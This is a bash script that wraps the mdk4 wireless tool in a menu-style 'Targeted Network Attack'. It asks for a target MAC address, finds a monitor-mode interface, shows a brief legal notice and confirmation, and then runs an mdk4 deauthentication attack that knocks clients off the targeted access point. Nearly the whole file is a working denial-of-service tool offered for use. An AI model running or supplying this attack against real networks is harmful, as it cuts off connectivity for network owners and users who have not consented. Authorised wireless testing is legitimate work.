#!/bin/bash

# Clear screen
clear

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Animation function
animate() {
    local text=$1
    echo -ne "${CYAN}"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.02
    done
    echo -e "${NC}"
}

# Banner function
show_banner() {
    echo -e "${PURPLE}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║                   Targeted Network Attack                  ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Validate MAC address format
validate_mac() {
    local mac=$1
    if [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        return 0
    else
        return 1
    fi
}

# Check if mdk4 is installed
check_mdk4() {
    if ! command -v mdk4 &> /dev/null; then
        echo -e "${RED}[!] mdk4 is not installed. Please install it first.${NC}"
        exit 1
    fi
}

# Main script
show_banner

# Check if mdk4 is available
check_mdk4

# Get target MAC address
echo
read -p "$(echo -e ${YELLOW}"[?] Enter the target MAC address: "${NC})" MAC

# Validate MAC address
if ! validate_mac "$MAC"; then
    echo -e "${RED}[!] Invalid MAC address format!${NC}"
    echo -e "${YELLOW}[i] Please use format like: AA:BB:CC:DD:EE:FF or AA-BB-CC-DD-EE-FF${NC}"
    exit 1
fi

# If you intended to use an ESSID, you need to define it
# For now, I'll comment this out since it's not defined
# echo "[+] You selected ESSID: $essid"

# Find monitor mode interface
animate "Looking for monitor mode interface..."

iface=$(iwconfig 2>/dev/null | grep "mon" | awk '{print $1}' | head -n1)        
if [[ -z "$iface" ]]; then
    echo -e "${RED}[-] No monitor mode interface found (ending with 'mon').${NC}"
    echo -e "${YELLOW}[!] Please enable monitor mode first.${NC}"
    exit 1
fi

echo -e "${GREEN}[✓] Found monitor mode interface: ${CYAN}$iface${NC}"

# Confirmation before attacking
echo
echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                    WARNING: LEGAL NOTICE                   ║${NC}"
echo -e "${RED}║                                                            ║${NC}"
echo -e "${RED}║  This action may be illegal in your jurisdiction.          ║${NC}"
echo -e "${RED}║  Use only on networks you own or have permission to test.  ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
echo

read -p "$(echo -e ${YELLOW}"[?] Are you sure you want to continue? (y/N): "${NC})" confirm

if [[ ! $confirm =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[+] Operation cancelled.${NC}"
    exit 0
fi

# Execute the attack
echo
echo -e "${RED}[~] Starting targeted attack on ${MAC}...${NC}"
echo -e "${YELLOW}[!] Press CTRL+C to stop the attack${NC}"
echo

# Add a small delay to show the message
sleep 2

# Execute mdk4 command
mdk4 "$iface" d -B "$MAC"
